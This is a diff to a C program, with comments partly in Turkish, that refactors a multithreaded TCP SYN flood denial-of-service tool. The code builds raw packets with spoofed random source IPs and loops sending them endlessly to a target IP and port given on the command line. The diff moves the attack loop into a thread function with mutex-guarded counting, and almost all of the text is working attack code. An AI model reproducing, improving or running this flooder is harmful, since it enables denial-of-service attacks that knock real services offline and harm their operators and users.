@@ -14,13 +14,16 @@
 #include "src/tanitim.c"
 #include "src/random-ip.c"
 
-
 #define KRMZ   "\x1B[31m"
 #define YSL   "\x1B[32m"
 #define SR   "\x1B[33m"
 #define MV   "\x1B[34m"
 #define RESET "\x1B[0m"
 
+// Global variable definitions.
+unsigned long p_num = 0;
+pthread_mutex_t mut;
+time_t start_time;
 
 struct sozde_baslik{
     unsigned int kaynak_adres;
@@ -28,8 +31,16 @@ struct sozde_baslik{
     unsigned char placeholder; //rezerve
     unsigned char protokol;
     unsigned short tcp_uzunlugu;
-
     struct tcphdr tcp;
+};
+
+// Newly created thread parameter structure
+struct thread_info{
+    int soket;
+    char datagram[4096];
+    struct iphdr *iph;
+    struct sockaddr_in sin;
+    struct sozde_baslik psh;
 };
 
 unsigned short csum(unsigned short *buf, int nbayt){
@@ -55,7 +66,53 @@ unsigned short csum(unsigned short *buf, int nbayt){
     return(cevap);
 }
 
+void bilgi(){
+        time_t end_time;
+        double time_diff;
+        time(&end_time);
+        time_diff = difftime(end_time, start_time);
+        printf("\n\n----------------------------------------------------------");
+        printf("\n\nNumber of PACKETS: "YSL"%d"RESET" \t Attack Time: "YSL"%.2f"RESET" second \n\n"RESET, p_num, time_diff);
+        printf("----------------------------------------------------------\n\n");
+        pthread_mutex_destroy(&mut);
+        exit(1);
+}
 
+void *attack(void *arg){
+    struct thread_info *attack_param = arg;
+    signal(SIGINT, (void *)bilgi);
+    while (1){ 
+        //Send packets
+        if (sendto (attack_param->soket,      // our socket 
+                    attack_param->datagram,   // datagram includes data and headers
+                    attack_param->iph->tot_len,    // total size of datagram
+                    0,      // flag
+                    (struct sockaddr *) &(attack_param->sin),   // socket address
+                    sizeof (attack_param->sin)) < 0)       // normal send() 
+        {
+            exit(1);
+        }
+        //If packet sending successful
+        else
+        {
+            // Critical section for packet numbers
+            pthread_mutex_lock(&mut);
+            p_num++;
+            if(p_num == 1)
+                printf(YSL"[+]"MV" Attack has been started!\n"RESET);
+            pthread_mutex_unlock(&mut);
+        }
+        // Random IP generate and assign 
+        char *str;
+        str = (char *)malloc(20 * sizeof(char *));
+        str = randomip(); 
+        attack_param->psh.kaynak_adres = htons(atoi(str));
+        attack_param->iph->saddr = inet_addr(str);
+        attack_param->iph->id = htons(rand());  //Paketin ID'si
+        free(str);
+    }
+
+}
 
 int main(int argc, char *argv[]){
 
@@ -64,52 +121,46 @@ int main(int argc, char *argv[]){
         printf(YSL"USAGE:"RESET"  %s <source port> <target IP> <target port> <threads number>\n", argv[0]);
         exit(0);
     }
-
+    
     tanitim();
+    
+    struct thread_info th_param;                                               
+    //Create raw socket
+    th_param.soket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(th_param.soket == -1){
+        printf (KRMZ"[-]"RESET" Create socket error! Error NO : %d . Error Message : %s \n" , errno , strerror(errno));
+        exit(0);
+    }
+    //Init datagram packet
+    char source_ip[32];
+    
+    //IP header
+    th_param.iph = (struct iphdr *)(th_param.datagram);
 
-    time_t baslangic, bitis;
-    time(&baslangic);
-    double zaman_farki;
-                
-                                                   
-    //Ham soket olustur
-    int soket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    //TCP header
+    struct tcphdr *tcph = (struct tcphdr *)(th_param.datagram + sizeof(struct ip));
+    
+    th_param.sin.sin_family = AF_INET;
+    th_param.sin.sin_port = htons(atoi(argv[1])); //Specify source port
+    th_param.sin.sin_addr.s_addr = inet_addr(argv[2]); //Specify target IP
 
-    //Datagram paketi hazirlar
-    char datagram[4096], source_ip[32];
+    memset(th_param.datagram, 0, 4096);  // Fill the buffer of datagram with 0
 
-    //IP basligi
-    struct iphdr *iph = (struct iphdr *)datagram;
+    //Set IP headers
+    th_param.iph->ihl = 5;
+    th_param.iph->version = 4;
+    th_param.iph->tos = 0;
+    th_param.iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
 
-    //TCP basligi
-    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
-    struct sockaddr_in sin;
-    struct sozde_baslik psh;
+    th_param.iph->id = htons(rand());  // Packet ID
+    th_param.iph->frag_off = 0;
+    th_param.iph->ttl = 255; // TTL = 255
+    th_param.iph->protocol = IPPROTO_TCP;
+    th_param.iph->check = 0;      // Set this before configure checksum
+    th_param.iph->daddr = th_param.sin.sin_addr.s_addr; // Assing target IP
+    th_param.iph->check = csum ((unsigned short *) th_param.datagram, th_param.iph->tot_len >> 1);
 
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(atoi(argv[1])); //Kaynak portu belirttik.
-    sin.sin_addr.s_addr = inet_addr(argv[2]); //Hedef IP ilerde kullanmak icin belirttik
-
-    memset(datagram, 0, 4096);  //Datagramı set ediyoruz
-
-    //IP basligini doldur
-    char *str;
-    str = (char *)malloc(20 * sizeof(char *));
-    str = randomip();  
-
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
-    iph->id = htons(rand());  //Paketin ID'si
-    iph->frag_off = 0;
-    iph->ttl = 255; //time to live suresi en uzun 255 ayarladik.
-    iph->protocol = IPPROTO_TCP;
-    iph->check = 0;      //Checksum hesaplanmadan once 0 ayarliyoruz
-    iph->daddr = sin.sin_addr.s_addr; //Hedef IP'yi belirtmistik.
-    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-
-    //TCP Basligi
+    //TCP Header
 
     tcph->source = htons(atoi(argv[1]));
     tcph->dest = htons(atoi(argv[3]));
@@ -122,24 +173,23 @@ int main(int argc, char *argv[]){
     tcph->psh=0;
     tcph->ack=0;
     tcph->urg=0;
-    tcph->window = htons (5840); /* max kabul edilen window boyutu*/
+    tcph->window = htons (5840); /* max allowed window size */
     tcph->check = 0;/* Eger checksumu 0 a ayarlarsak, kernelimiz iletim sırasında dogrusunu ayarlayacaktir */
     tcph->urg_ptr = 0;
-    //IP cheksumu
-     
-    psh.hedef_adres = sin.sin_addr.s_addr;
-    psh.placeholder = 0;
-    psh.protokol = IPPROTO_TCP;
-    psh.tcp_uzunlugu = htons(20);
-     
-    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
-     
-    tcph->check = csum( (unsigned short*) &psh , sizeof (struct sozde_baslik));
+    
+    th_param.psh.hedef_adres = th_param.sin.sin_addr.s_addr;
+    th_param.psh.placeholder = 0;
+    th_param.psh.protokol = IPPROTO_TCP;
+    th_param.psh.tcp_uzunlugu = htons(20);
+
+    memcpy(&(th_param.psh).tcp , tcph , sizeof (struct tcphdr));
+    
+    tcph->check = csum( (unsigned short*) &(th_param.psh) , sizeof (struct sozde_baslik));
      
     //IP_HDRINCL kernele headerin pakete include edildigini soyler
     int one = 1;
     const int *val = &one;
-    if (setsockopt (soket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+    if (setsockopt (th_param.soket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
     {
         printf (KRMZ"[-]"RESET" IP_HDRINCL error! Error NO : %d . Error Message : %s \n" , errno , strerror(errno));
         exit(0);
@@ -147,64 +197,20 @@ int main(int argc, char *argv[]){
     else{
         printf(YSL"[+] "RESET"IP_HDRINCL success!\n");
     }
-    unsigned long p_sayi = 0;
-
-    //Attack fonksiyonu threadin argv parametrelerini kullanması için main fonksiyonunun icinde olusturuldu
-    void *attack(void *bos){
-        void bilgi(){
-            time(&bitis);
-            zaman_farki = difftime(bitis, baslangic);
-            printf("\n\n----------------------------------------------------------");
-            printf("\n\nNumber of PACKETS: "YSL"%d"RESET" \t Attack Time: "YSL"%.2f"RESET" second \n\n"RESET, p_sayi, zaman_farki);
-            printf("----------------------------------------------------------\n\n");
-            exit(1);
-        }
-        signal(SIGINT, bilgi);
-        while (1){
-        p_sayi++;
-        
-        //Paketi yolla
-        if (sendto (soket,      // soketimiz 
-                    datagram,   // buffer iceren basliklar ve veriler
-                    iph->tot_len,    // datagramin toplam boyutu
-                    0,      // yonlendirme bayragi genellikle 0 oluyor 
-                    (struct sockaddr *) &sin,   // soket adresi
-                    sizeof (sin)) < 0)       // normal bir send() 
-        {
-            printf ("[-] ERROR\n");
-            exit(1);
-        }
-        //Basarili ise
-        else
-        {
-            if(p_sayi == 1)
-                printf(YSL"[+]"MV" Attack has been started!\n"RESET);
-
-        }
-        
-        psh.kaynak_adres = htons(atoi(str));
-        iph->saddr = inet_addr(str);
-        iph->id = htons(rand());  //Paketin ID'si
-        str = randomip(); //Bir IP SYN yolladiginda, hemen diger IP'yi uretiyoruz.
-    }
-
-    }
-
     int thread_number = atoi(argv[4]);
     pthread_t thread[thread_number];
-
+    pthread_mutex_init(&mut, NULL); // Init mutex 
+    time(&start_time); // Start timer
     for(int i = 0; i < thread_number; i++){
-        if(pthread_create(&thread[i], NULL, &attack, NULL) != 0){
+        if(pthread_create(&thread[i], NULL, &attack, &th_param) != 0){
             printf(KRMZ"[-]"RESET" Failed the create THREADS!\n");
             exit(1);
         }
         else{
-            while(1)
-                sleep(1); //Sonsuz DDoS attack with threads. Burada threadleri bekletiyoruz.
-               
+            if(i == thread_number - 1) // if all thread has started
+                while(1)
+                    sleep(1); // wait main thread.
         }
     } 
-       
-
     return 0;
 }
